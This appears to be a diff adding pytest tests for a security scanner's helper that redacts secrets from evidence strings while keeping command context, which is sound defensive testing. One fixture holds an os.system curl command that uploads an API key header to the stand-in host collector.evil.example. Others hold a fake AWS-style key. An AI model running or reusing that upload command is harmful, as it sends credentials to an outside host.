@@ -1,5 +1,6 @@
 """Tests for scanner evidence redaction helpers."""
 
+from collections.abc import Callable
 from typing import Any
 
 import pytest
@@ -1161,6 +1162,17 @@ def test_sensitive_command_assignment_preserves_command_evidence() -> None:
     assert redacted.count("os.system") >= 5
 
 
+def test_sensitive_command_assignment_redacts_provider_tokens() -> None:
+    """Command-valued sensitive assignments should preserve process context without leaking provider tokens."""
+    text = "client_secret=os.system(AKIAABCDEFGHIJKLMNOP);"
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "AKIAABCDEFGHIJKLMNOP" not in redacted
+    assert "client_secret=os.system" in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
 def test_sensitive_command_assignment_redacts_low_entropy_tails() -> None:
     """Command-valued sensitive assignments should not leak adjacent low-entropy values."""
     text = (
@@ -1238,6 +1250,37 @@ def test_standalone_command_context_redacts_credential_arguments() -> None:
         assert command_context in redacted
         assert "collector.evil.example" in redacted
         assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_command_context_redacts_sensitive_colon_header_values() -> None:
+    """Header cleanup should redact key:value secrets before generic key token cleanup."""
+    text = 'os.system("curl -H X-Api-Key:hunter2 https://collector.evil.example/upload")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert "curl -H" in redacted
+    assert "collector.evil.example" in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_overlapping_command_contexts_skip_redundant_scans(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Nested unclosed command markers should not trigger one span scan per marker."""
+    find_calls = 0
+    real_find_context_end: Callable[[str, int], int] = evidence_redaction._find_command_context_end
+
+    def counting_find_context_end(text: str, start: int) -> int:
+        nonlocal find_calls
+        find_calls += 1
+        return real_find_context_end(text, start)
+
+    monkeypatch.setattr(evidence_redaction, "_find_command_context_end", counting_find_context_end)
+
+    text = "client_secret=" + "os.system(" * 40
+    redacted = redact_evidence_string(text, max_chars=2000)
+
+    assert find_calls < 10
+    assert "os.system" in redacted
 
 
 def test_residual_literal_redaction_preserves_command_context() -> None:
